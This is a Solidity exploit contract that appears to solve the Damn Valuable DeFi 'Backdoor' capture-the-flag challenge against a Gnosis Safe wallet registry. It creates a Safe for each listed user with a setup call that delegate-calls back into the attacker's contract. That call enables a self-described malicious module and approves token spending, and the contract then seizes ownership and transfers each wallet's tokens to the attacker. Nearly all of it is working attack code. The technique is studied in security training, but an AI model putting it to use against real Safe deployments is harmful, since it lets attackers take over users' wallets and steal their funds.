// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/base/OwnerManager.sol";

import "./DamnValuableToken.sol";
import "hardhat/console.sol";

import "@gnosis.pm/safe-contracts/contracts/base/ModuleManager.sol";
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "./ControllerModule.sol";

contract Exploit {
    mapping(address => address) internal modules;

    address public attacker;
    address public factory;
    address public masterCopy;
    address public walletRegistry;
    address public token;
    address public thisContract;
    address public computedProxyAddress;
    ControllerModule public controllerModule;

    constructor(
        address _owner,
        address _factory,
        address _masterCopy,
        address _walletRegistry,
        address _token
    ) {
        attacker = _owner;
        factory = _factory;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
        token = _token;
        //console.log("exploit address", address(this));
        thisContract = address(this);
        controllerModule = new ControllerModule();
    }

    function setupToken(address _tokenAddress, address _exploit) external {
        //called during Gnosis Safe initiation
        //the attacker is being granted the approval to spend tokens by the proxy contract
        //proxy contract is going to delegate call this contract and run this function

        Exploit exploit = Exploit(_exploit);
        GnosisSafe _gnosisSafe = GnosisSafe(payable(Exploit(_exploit).computedProxyAddress()));
        console.log("Setting up Malicous module for safe:", address(_gnosisSafe));
        console.log(
            "Module enabled status (before callling enableModule()):",
            _gnosisSafe.isModuleEnabled(address(exploit.controllerModule()))
        );

        console.log("setting malicious module to:", address(exploit.controllerModule()));
        _gnosisSafe.enableModule(address(exploit.controllerModule()));

        console.log(
            "Module enabled status enabled (after callling enableModule):",
            _gnosisSafe.isModuleEnabled(address(exploit.controllerModule()))
        );

        DamnValuableToken(_tokenAddress).approve(_exploit, 10 ether);
    }

    function exploit(address[] memory users, bytes memory setupData) external {
        for (
            uint256 i = 0;
            i < users.length; /*users.length*/
            i++
        ) {
            console.log("Exploiting user#:", i);
            console.log("User wallet address:", users[i]);
            address user = users[i];
            address[] memory victim = new address[](1);
            victim[0] = user;

            // Create ABI call for proxy
            // Calling the Gnosis Proxy setup function
            string
                memory signatureString = "setup(address[],uint256,address,bytes,address,address,uint256,address)";
            bytes memory initGnosis = abi.encodeWithSignature(
                signatureString,
                victim,
                uint256(1), //THERSHOLD = 1
                address(this), //to address / what modules to be setup
                setupData, // setup data
                address(0),
                address(0),
                uint256(0),
                address(0)
            );

            //calculating salt for create2()
            uint256 salt = 0;
            uint256 saltNonceWithCallback = uint256(
                keccak256(abi.encodePacked(salt, walletRegistry))
            );

            bytes memory deploymentCode = abi.encodePacked(
                type(GnosisSafeProxy).creationCode,
                uint256(uint160(masterCopy))
            );

            bytes32 salt2 = keccak256(
                abi.encodePacked(keccak256(initGnosis), saltNonceWithCallback)
            );

            bytes32 hash = keccak256(
                abi.encodePacked(bytes1(0xff), address(factory), salt2, keccak256(deploymentCode))
            );

            address deploymentAddress = address(uint160(uint256(hash)));

            computedProxyAddress = deploymentAddress;
            console.log("Computed Proxy Address:", computedProxyAddress);

            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory).createProxyWithCallback(
                masterCopy,
                initGnosis,
                salt, //randomSalt
                IProxyCreationCallback(walletRegistry)
            );
            console.log("Actual Deployed Proxy address:", address(newProxy));

            GnosisSafe _gnosisSafe = GnosisSafe(payable(newProxy));
            console.log("module address", address(controllerModule));
            console.log(
                "Module enabled status (after deployment):",
                _gnosisSafe.isModuleEnabled(address(controllerModule))
            );

            address _owner = _gnosisSafe.getOwners()[0];
            console.log("owner:", _owner);

            ControllerModule(address(newProxy)).becomeOwner(address(newProxy), attacker);

            _owner = _gnosisSafe.getOwners()[0];
            console.log("owner:", _owner);

            DamnValuableToken(token).transferFrom(address(newProxy), attacker, 10 ether);
            uint256 balance = DamnValuableToken(token).balanceOf(attacker);

            console.log("Balance:", balance);
        }
    }
}
